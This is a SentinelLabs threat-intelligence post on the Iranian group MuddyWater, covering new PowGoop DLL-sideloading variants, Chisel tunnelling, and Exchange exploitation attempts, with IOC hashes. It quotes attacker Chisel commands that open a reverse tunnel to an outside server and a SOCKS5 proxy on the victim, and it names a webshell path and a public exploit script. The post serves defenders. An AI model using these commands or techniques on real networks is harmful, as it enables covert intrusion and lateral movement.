@@ -1,0 +1,437 @@
+  * [ ](https://twitter.com/LabsSentinel "Twitter")
+  * [ ](https://www.linkedin.com/company/sentinelone "LinkedIn")
+
+![Search Icon White](data:image/svg+xml;utf8,<svg
+xmlns='http://www.w3.org/2000/svg' width='24' height='24'><rect width='100%'
+height='100%' fill='none'/></svg>)
+
+![Search Icon White](data:image/svg+xml;utf8,<svg
+xmlns='http://www.w3.org/2000/svg' width='24' height='24'><rect width='100%'
+height='100%' fill='none'/></svg>) ![Navigation
+Close](data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'
+width='18' height='16'><rect width='100%' height='100%' fill='none'/></svg>)
+
+[ ![SentinelLabs Logo RGB WhitePurp](data:image/svg+xml;utf8,<svg
+xmlns='http://www.w3.org/2000/svg' width='566' height='102'><rect width='100%'
+height='100%' fill='none'/></svg>) ](/labs/)
+
+[ABOUT](/labs/about/)
+
+[CONTACT](/labs/contact/)
+
+[VISIT SENTINELONE.COM](/)
+
+![](data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'
+width='1200' height='628'><rect width='100%' height='100%'
+fill='none'/></svg>)
+
+[Advanced Persistent
+Threat](https://www.sentinelone.com/labs/category/advanced-persistent-threat/)
+
+# Wading Through Muddy Waters | Recent Activity of an Iranian State-Sponsored Threat Actor
+
+[Amitai Ben Shushan Ehrlich](https://www.sentinelone.com/blog/author/amitaib/)
+/  [ January 12, 2022 ](https://www.sentinelone.com/blog/2022/01/)
+
+## Overview
+
+MuddyWater is commonly considered an Iranian state-sponsored threat actor but
+no further granularity has previously been available. As of January 12th,
+2022, U.S. CyberCommand has attributed this [activity to the Iranian Ministry
+of Intelligence
+(MOIS)](https://twitter.com/CNMF_CyberAlert/status/1481341952247349248?s=20).
+While some cases allow for attribution hunches, or even fleshed out
+connections to handles and online personas, attribution to a particular
+government organization is often reserved to the kind of visibility only
+available to governments with a well-developed all-source and signals
+intelligence apparatus.
+
+As in all cases of public government attribution, we take this as an
+opportunity to reassess our assumptions about a given threat actor all the
+while recognizing that we can’t independently verify the basis for this claim.
+
+U.S. Cyber Command pointed to multiple malware sets used by MuddyWater. Among
+those, PowGoop correlates with activities we’ve triaged in recent incidents.
+We hope sharing relevant in-the-wild findings will further bolster our
+collective defense against this threat.
+
+> Iranian MOIS hacker group
+> [#MuddyWater](https://twitter.com/hashtag/MuddyWater?src=hash&ref_src=twsrc%5Etfw)
+> is using a suite of malware to conduct espionage and malicious activity. If
+> you see two or more of these malware on your network, you may have
+> MuddyWater on it: <https://t.co/xTI6xuQOg3>. Attributed through
+> [@NCIJTF](https://twitter.com/ncijtf?ref_src=twsrc%5Etfw)
+> [@FBI](https://twitter.com/FBI?ref_src=twsrc%5Etfw)
+>
+> — USCYBERCOM Cybersecurity Alert (@CNMF_CyberAlert) [January 12,
+> 2022](https://twitter.com/CNMF_CyberAlert/status/1481341952247349248?ref_src=twsrc%5Etfw)
+
+## Analysis of New PowGoop Variants
+
+PowGoop is a malware family first described by [Palo
+Alto](https://unit42.paloaltonetworks.com/thanos-ransomware/) which utilizes
+DLL search order hijacking (T1574.001). The name derives from the usage
+'`GoogleUpdate.exe`' to load a malicious modified version of ‘`goopdate.dll`‘,
+which is used to load a malicious PowerShell script from an external file.
+Other variants were described by [ClearSkySec](https://www.clearskysec.com/wp-
+content/uploads/2020/10/Operation-Quicksand.pdf) and
+[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-
+intelligence/seedworm-apt-iran-middle-east).
+
+We identified newer variants of PowGoop loader that involve significant
+changes, suggesting the group continues to use and maintain it even after
+recent exposures. The new variants reveal that the threat group has expanded
+its arsenal of legitimate software used to load malicious DLLs. Aside from
+‘`GoogleUpdate.exe`’, three additional benign pieces of software are abused in
+order to sideload malicious DLLs: ‘`Git.exe`’, ‘`FileSyncConfig.exe`’ and
+‘`Inno_Updater.exe`’.
+
+Each contains a modified DLL and a renamed authentic DLL. The hijacked DLL
+contains imports originating from its renamed counterpart, as well as two
+additional functions written by the attackers. The list of hijacked DLLs is
+presented below:
+
+**Software Name** | **Hijacked DLL** | **Renamed DLL**  
+---|---|---  
+GoogleUpdate.exe | goopdate.dll | goopdate86.dll  
+inno_updater.exe | vcruntime140.dll | vcruntime141.dll  
+FileSyncConfig.exe | vcruntime140.dll | vcruntime141.dll  
+git.exe | libpcre2-8-0.dll | libpcre2-8-1.dll  
+  
+Unlike previous versions, the hijacked DLLs attempt to reflectively load two
+additional files, one named ‘`Core.dat`’, which is a shellcode called from the
+export ‘`DllReg`’ and the other named ‘`Dore.dat`’, which is a PE file with a
+``MZRE`` header, allowing it to execute as a shellcode as well, similarly to
+the publicly [reported](https://www.cobaltstrike.com/help-malleable-postex)
+techniques, called from the export ‘`DllRege`’.
+
+Those two ‘`.dat`’ files are identical for each of the hijacked DLLs and are
+both executed using rundll32 on their respective export, which reads the file
+from disk to a virtually allocated buffer, followed by a call to offset 0 in
+the read data.
+
+Both ‘`Dore.dat`’ and ‘`Core.dat`’ search for a file named ‘config.txt’ and
+run it using PowerShell in a fashion similar to older versions (`T1059.001`).
+The overlap in functionality between the two components is not clear; however,
+it is evident that ‘`Core.dat`’ represents a more mature and evolved version
+of PowGoop as it is loaded as a shellcode, making it less likely to be
+detected statically.
+
+It is also worth noting that it is not necessary for both components to reside
+on the infected system as the malware will execute successfully with either
+one. Given that, it is possible that one or the other could be used as a
+backup component. The PowerShell payloads within ‘`config.txt`’ could not be
+retrieved at the time of writing.
+
+![Execution flow of new PowGoop variants](https://www.sentinelone.com/wp-
+content/uploads/2022/01/S1-Diagram_Dark-2.png)Execution flow of new PowGoop
+variants
+
+## MuddyWater Tunneling Activity
+
+The operators behind MuddyWater activities are very fond of tunneling tools,
+as described in several recent blog posts(T1572). The custom tools used by the
+group often provide limited functionality, and are used to drop tunneling
+tools which enable the operators to conduct a wider set of activities. Among
+the tunneling tools MuddyWater attackers were observed using are
+[Chisel](https://github.com/jpillora/chisel),
+[SSF](https://github.com/securesocketfunneling/ssf) and
+[Ligolo](https://github.com/sysdream/ligolo).
+
+The nature of tunneling activities is often confusing. However, analysis of
+Chisel executions by MuddyWater operators on some of the victims helps clarify
+their usage of such tools. This is an example of a command executed by the
+attackers on some of the victims:
+
+    
+    
+     SharpChisel.exe client xx.xx.xx.xx:8080 r:8888:127.0.0.1:9999
+
+The “`r`” flag used in the client execution implies the server is running in
+“reverse” mode. Setting the `--reverse` flag, according to Chisel
+documentation, “allows clients to specify reverse port forwarding remotes in
+addition to normal remotes”.
+
+In this case, the “`SharpChisel.exe`” client runs on the victim machine,
+connects back to the Chisel server over port 8080, and specifies to forward
+anything coming over port 8888 of the server to port 9999 of the client.
+
+This might look odd at first sight as port 9999 is not normally used on
+Windows machines and is not bound to any specific service. This is clarified
+shortly afterwards as the reverse tunnel is followed by setting up a Chisel
+SOCKS5 server on the victim, waiting for incoming connections over port 9999:
+
+    
+    
+    SharpChisel.exe server -p 9999 --socks5
+
+By setting up both a server and a client instance of Chisel on the machine,
+the operators enable themselves to tunnel a variety of protocols which are
+supported over SOCKS5. This actually creates a tunnel within a tunnel. Given
+that, it is most likely the operator initiated SOCKS traffic to the server
+over port 8888, tunneling traffic from applications of interest to inner parts
+of the network.
+
+The usage of Chisel and other tunneling tools effectively enable the threat
+actor to connect to machines within target environments as if they were inside
+the operator LAN.
+
+![Summary of MuddyWater tunneling using
+Chisel](https://www.sentinelone.com/wp-
+content/uploads/2022/01/S1-Diagram_Dark-1.png)Summary of MuddyWater tunneling
+using Chisel
+
+## Exchange Exploitation
+
+When tracking MuddyWater activity, we came across an interesting subset of
+activity targeting Exchange servers of high-profile organizations. This subset
+of Exchange exploitation activity is rather interesting, as without context it
+would be difficult to attribute it to MuddyWater because the activity relies
+almost completely on publicly available offensive security tools.  
+The attackers attempt to exploit Exchange servers using two different tools:
+
+  * A publicly available script for exploiting CVE-2020-0688 (T1190)
+  * Ruler - an open source Exchange exploitation framework
+
+## CVE-2020-0688 Exploitation
+
+Analysis of the activity observed suggests the MuddyWater threat group
+attempted to exploit CVE-2020-0688 on governmental organizations in the Middle
+East. The exploit enables remote code execution for an authenticated user. The
+specific exploit MuddyWater operators were attempting to run was utilized to
+drop a webshell.
+
+The attempted webshell drop was performed using a set of PowerShell commands
+that write the webshell content into a specific path
+"`/ecp/HybridLogout.aspx`". The webshell awaits the parameter “`cmd`” and runs
+the commands in it utilizing XSL Script Processing (T1220).
+
+![A snippet of the webshell MuddyWater attempted to upload to Exchange
+servers](https://www.sentinelone.com/wp-content/uploads/2022/01/A-snippet-of-
+the-webshell-MuddyWater-attempted-to-upload-to-Exchange-servers-1.png)A
+snippet of the webshell MuddyWater attempted to upload to Exchange servers
+
+This activity is highly correlated with a CVE-2020-0688 exploitation script
+from a Github repository named
+[fuckchina_v2.py](https://github.com/w4fz5uck5/cve-2020-0688-webshell-upload-
+technique/blob/master/fuckchina_v2.py). The script utilizes CVE-2020-0688 to
+upload an ASPX webshell to the path : "`/ecp/HybridLogout.aspx`" (T1505.003).
+It is also one of the only publicly available CVE-2020-0688 implementations
+that drop a web shell.
+
+![A snippet of CVE-2020-0688 exploitation
+script](https://www.sentinelone.com/wp-content/uploads/2022/01/A-snippet-of-
+CVE-2020-0688-exploitation-script-.png)A snippet of CVE-2020-0688 exploitation
+script
+
+## Ruler Exploitation
+
+Among other activities performed by the threat actors was attempted
+[Ruler](https://github.com/sensepost/ruler) exploitation. The instance
+identified targeted a telecommunication company in the Middle East. The
+observed activity suggests the threat actor attempted to create malicious
+forms, which is one of the most common usages of Ruler (T1137.003).
+
+Usage of Ruler was previously associated with other Iranian threat actors,
+most commonly with [APT33](https://www.fireeye.com/blog/threat-
+research/2018/12/overruled-containing-a-potentially-destructive-
+adversary.html).
+
+## Summary
+
+Analysis of MuddyWater activity suggests the group continues to evolve and
+adapt their techniques. While still relying on publicly available offensive
+security tools, the group has been refining its custom toolset and utilizing
+new techniques to avoid detection. This is observed through the three distinct
+activities observed and analyzed in this report: The evolution of the PowGoop
+malware family, the usage of tunneling tools, and the targeting of Exchange
+servers in high-profile organizations.
+
+Like many other Iranian threat actors, the group displays less sophistication
+and technological complexity compared to other state-sponsored APT groups.
+Even so, it appears MuddyWater’s persistency is a key to their success, and
+their lack of sophistication does not appear to prevent them from achieving
+their goals.
+
+## Indicators of Compromise
+
+**PowGoop variants (MD5, SHA1, SHA256)**
+
+  * Goopdate.dll 
+    * A5981C4FA0A3D232CE7F7CE1225D9C7E
+    * 8FED2FF6B739C13BADB14C1A884D738C80CB6F34
+    * AA48F06EA8BFEBDC0CACE9EA5A2F9CE00C094CE10DF52462C4B9E87FEFE70F94
+  * Libpcre2-8-0.dll 
+    * F8E7FF6895A18CC3D05D024AC7D8BE3E
+    * 97248B6E445D38D48334A30A916E7D9DDA33A9B2
+    * F1178846036F903C28B4AB752AFE1B38B531196677400C2250AC23377CF44EC3
+  * Vcruntime140.dll 
+    * CEC48BCDEDEBC962CE45B63E201C0624
+    * 81F46998C92427032378E5DEAD48BDFC9128B225
+    * DD7EE54B12A55BCC67DA4CEAED6E636B7BD30D4DB6F6C594E9510E1E605ADE92
+  * Core.dat 
+    * A65696D6B65F7159C9FFCD4119F60195
+    * 570F7272412FF8257ED6868D90727A459E3B179E
+    * B5B1E26312E0574464DDEF92C51D5F597E07DBA90617C0528EC9F494AF7E8504
+  * Dore.dat 
+    * 6C084C8F5A61C6BEC5EB5573A2D51FFB
+    * 61608ED1DE56D0E4FE6AF07ECBA0BD0A69D825B8
+    * 7E7545D14DF7B618B3B1BC24321780C164A0A14D3600DBAC0F91AFBCE1A2F9F4
+
+**MITRE ATT &CK**
+
+  * T1190 - Exploit Public-Facing Application
+  * T1572 - Protocol Tunneling
+  * T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking
+  * T1059.001 - Command and Scripting Interpreter: PowerShell
+  * T1505.003 - Server Software Component: Web Shell
+  * T1220 - XSL Script Processing
+
+[Iran](https://www.sentinelone.com/blog/tag/iran/)
+
+[Muddy Waters](https://www.sentinelone.com/blog/tag/muddy-waters/)
+
+[PowGoop](https://www.sentinelone.com/blog/tag/powgoop/)
+
+## Share
+
+[
+](https://twitter.com/intent/tweet?url=https://www.sentinelone.com/labs/wading-
+through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-
+actor/&text=Wading%20Through%20Muddy%20Waters%20%7C%20Recent%20Activity%20of%20an%20Iranian%20State-
+Sponsored%20Threat%20Actor) [
+](https://www.facebook.com/sharer.php?u=https://www.sentinelone.com/labs/wading-
+through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-
+actor/) [
+](https://www.linkedin.com/shareArticle?mini=true&url=https://www.sentinelone.com/labs/wading-
+through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-
+actor/) [
+](http://reddit.com/submit?url=https://www.sentinelone.com/labs/wading-
+through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-
+actor/) [ ](/cdn-cgi/l/email-
+protection#152a6660777f707661284274717c7b72302725417d677a60727d302725586071716c302725427461706766302725302256302725477076707b613027255476617c637c616c3027257a73302725747b3027255c67747b7c747b30272546617461703846657a7b667a677071302725417d677074613027255476617a67337478652e777a716c287d616165663026543027533027536262623b66707b617c7b70797a7b703b767a78302753797477663027536274717c7b7238617d677a60727d38786071716c3862746170676638677076707b61387476617c637c616c387a7338747b387c67747b7c747b3866617461703866657a7b667a67707138617d67707461387476617a67302753)
+[
+](sms:?body=Wading%20Through%20Muddy%20Waters%20%7C%20Recent%20Activity%20of%20an%20Iranian%20State-
+Sponsored%20Threat%20Actor%20-%20https%3A%2F%2Fwww.sentinelone.com%2Flabs%2Fwading-
+through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-
+actor%2F)
+
+![](https://secure.gravatar.com/avatar/5bf09b3ef539a58542155e95c1f5e64122d69070e7c3ec651624aeabb3f7dad2?s=120&d=mm&r=g)
+
+####  [ Amitai Ben Shushan Ehrlich
+](https://www.sentinelone.com/blog/author/amitaib/)
+
+Amitai is a Threat Intelligence Researcher at SentinelOne who specializes in
+threat intelligence, incident response and threat hunting. Before joining
+SentinelOne, he spent two years responding to targeted and financially
+motivated incidents, focusing on attribution and characterization of threat
+actors. Previously, he spent over 5 years at the IDF as a threat researcher
+and a threat research team lead.
+
+[PrevCVE-2021-45608 | NetUSB RCE Flaw in Millions of End User Routers](https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/)
+
+[NextBlackCat Ransomware | Highly-Configurable, Rust-Driven RaaS On The Prowl For Victims](https://www.sentinelone.com/labs/blackcat-ransomware-highly-configurable-rust-driven-raas-on-the-prowl-for-victims/)
+
+## Related Posts
+
+![](data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'
+width='300' height='157'><rect width='100%' height='100%' fill='none'/></svg>)
+
+###  [ fast16 | Mystery Shadow Brokers Reference Reveals High-Precision Software Sabotage 5 Years Before Stuxnet ](https://www.sentinelone.com/labs/fast16-mystery-shadowbrokers-reference-reveals-high-precision-software-sabotage-5-years-before-stuxnet/)
+
+April 23 2026
+
+![](data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'
+width='300' height='157'><rect width='100%' height='100%' fill='none'/></svg>)
+
+###  [ Ghost in the Zip | New PXA Stealer and Its Telegram-Powered Ecosystem ](https://www.sentinelone.com/labs/ghost-in-the-zip-new-pxa-stealer-and-its-telegram-powered-ecosystem/)
+
+August 04 2025
+
+![](data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'
+width='300' height='157'><rect width='100%' height='100%' fill='none'/></svg>)
+
+###  [ China’s Covert Capabilities | Silk Spun From Hafnium ](https://www.sentinelone.com/labs/chinas-covert-capabilities-silk-spun-from-hafnium/)
+
+July 30 2025
+
+## Search
+
+Search ...
+
+## Sign Up
+
+Get notified when we post new content.
+
+Thanks! Keep an eye out for new content!
+
+## Recent Posts
+
+  * [![LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout](https://www.sentinelone.com/wp-content/uploads/2026/05/Bachio_Roberts_ftr-150x150.jpg)](https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/)
+
+[LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout](https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/)
+
+May 14, 2026
+
+  * [![PCPJack | Cloud Worm Evicts TeamPCP and Steals Credentials at Scale](https://www.sentinelone.com/wp-content/uploads/2026/05/teampcp-pcpjacked-150x150.jpg)](https://www.sentinelone.com/labs/cloud-worm-evicts-teampcp-and-steals-credentials-at-scale/)
+
+[PCPJack | Cloud Worm Evicts TeamPCP and Steals Credentials at Scale](https://www.sentinelone.com/labs/cloud-worm-evicts-teampcp-and-steals-credentials-at-scale/)
+
+May 7, 2026
+
+  * [![LABScon25 Replay | Please Connect to the Foreign Entity to Enhance Your User Experience](https://www.sentinelone.com/wp-content/uploads/2026/04/lc25_joe_fitz_ftr-150x150.jpg)](https://www.sentinelone.com/labs/labscon25-replay-please-connect-to-the-foreign-entity-to-enhance-your-user-experience/)
+
+[LABScon25 Replay | Please Connect to the Foreign Entity to Enhance Your User Experience](https://www.sentinelone.com/labs/labscon25-replay-please-connect-to-the-foreign-entity-to-enhance-your-user-experience/)
+
+May 6, 2026
+
+## Labs Categories
+
+  * [Crimeware](https://www.sentinelone.com/labs/category/crimeware/)
+  * [Security Research](https://www.sentinelone.com/labs/category/security-research/)
+  * [LABScon](https://www.sentinelone.com/labs/category/labscon/ "LABScon is an intimate event for the world’s top cybersecurity minds to gather, share cutting-edge research, and push the envelope of threat landscape understanding. Presented by SentinelOne.")
+  * [Advanced Persistent Threat](https://www.sentinelone.com/labs/category/advanced-persistent-threat/)
+  * [Adversary](https://www.sentinelone.com/labs/category/adversary/)
+  * [Security & Intelligence](https://www.sentinelone.com/labs/category/security-intelligence/)
+  * [AI Research](https://www.sentinelone.com/labs/category/ai-research/)
+
+## SentinelLabs
+
+In the era of interconnectivity, when markets, geographies, and jurisdictions
+merge in the melting pot of the digital domain, the perils of the threat
+ecosystem become unparalleled. Crimeware families achieve an unparalleled
+level of technical sophistication, APT groups are competing in fully-fledged
+cyber warfare, while once decentralized and scattered threat actors are
+forming adamant alliances of operating as elite corporate espionage teams.
+
+## Recent Posts
+
+  * [![LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout](https://www.sentinelone.com/wp-content/uploads/2026/05/Bachio_Roberts_ftr-150x150.jpg)](https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/)
+
+[LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout](https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/)
+
+May 14, 2026
+
+  * [![PCPJack | Cloud Worm Evicts TeamPCP and Steals Credentials at Scale](https://www.sentinelone.com/wp-content/uploads/2026/05/teampcp-pcpjacked-150x150.jpg)](https://www.sentinelone.com/labs/cloud-worm-evicts-teampcp-and-steals-credentials-at-scale/)
+
+[PCPJack | Cloud Worm Evicts TeamPCP and Steals Credentials at Scale](https://www.sentinelone.com/labs/cloud-worm-evicts-teampcp-and-steals-credentials-at-scale/)
+
+May 7, 2026
+
+  * [![LABScon25 Replay | Please Connect to the Foreign Entity to Enhance Your User Experience](https://www.sentinelone.com/wp-content/uploads/2026/04/lc25_joe_fitz_ftr-150x150.jpg)](https://www.sentinelone.com/labs/labscon25-replay-please-connect-to-the-foreign-entity-to-enhance-your-user-experience/)
+
+[LABScon25 Replay | Please Connect to the Foreign Entity to Enhance Your User Experience](https://www.sentinelone.com/labs/labscon25-replay-please-connect-to-the-foreign-entity-to-enhance-your-user-experience/)
+
+May 6, 2026
+
+## Sign Up
+
+Get notified when we post new content.
+
+Thanks! Keep an eye out for new content!
+
+  * [ Twitter ](https://twitter.com/LabsSentinel "Twitter")
+  * [ LinkedIn ](https://www.linkedin.com/company/sentinelone "LinkedIn")
+
+©2026 SentinelOne, All Rights Reserved.
+
